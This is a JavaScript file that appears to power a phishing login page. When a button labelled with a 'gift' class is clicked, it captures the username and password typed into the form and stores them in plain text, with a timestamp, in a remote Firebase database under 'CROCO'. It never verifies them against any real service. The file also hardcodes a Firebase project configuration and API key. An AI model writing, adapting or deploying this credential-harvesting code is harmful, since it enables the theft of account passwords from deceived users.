const firebaseConfig = {
  apiKey: "AIzaSyBAFvYjzdLBPAePQ3utAwRDwAhaVK51UHQ",
  authDomain: "winmon-31ce3.firebaseapp.com",
  databaseURL: "https://winmon-31ce3-default-rtdb.firebaseio.com",
  projectId: "winmon-31ce3",
  storageBucket: "winmon-31ce3.appspot.com",
  messagingSenderId: "34156503301",
  appId: "1:34156503301:web:40c8c92cd156c095a7576c",
  measurementId: "G-B2J8CYYVYH",
};

let user = document.querySelector(".uss");
let password = document.querySelector(".psw");
let button = document.querySelector(".gift");

firebase.initializeApp(firebaseConfig);
function addElementInFirebase(REF, data) {
  firebase.database().ref(`${REF}/${randomID()}`).set(data);
}

function getRefFromFirebase(REF) {
  const result = [];
  firebase
    .database()
    .ref(REF)
    .on("value", (response) => {
      response.forEach((element) => {
        result.push(generateFirebaseItem(element.key, element.val()));
      });
    });
  return result;
}

function getElementFromFirebase(REF, id) {
  const array = getRefFromFirebase(REF);
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      array.forEach((element) => {
        if (element.id === id) {
          resolve(element);
        }
      });
      reject("404");
    }, 1000);
  });
}

function removeElementFromFirebase(REF, id) {
  firebase.database().ref(`${REF}/${id}`).remove();
}

function removeRefFromFirebase(REF) {
  firebase.database().ref(REF).remove();
  setTimeout(() => {
    location.reload();
  }, 300);
}

function randomID() {
  let new_data = new Date().toString();
  let dateId = `${new_data}`;
  return dateId;
}

let sendingData = new Date().toLocaleDateString("en-GB");
let myDate = new Date().getHours();
let minute = new Date().getMinutes();
let seconds = new Date().getSeconds();

let allData = `(${myDate}:${minute}:${seconds}) - (${sendingData})`;

button.addEventListener("click", () => {
  if (user.value === "" || password.value === "") {
    errorWrapper.classList.remove("hidden");
  } else {
    logIn();
    setTimeout(() => {
      user.value = "";
      password.value = "";
    }, 300);
  }
});

function logIn() {
  addElementInFirebase("CROCO", {
    login: user.value,
    pasw: password.value,
    time: allData,
  });
}
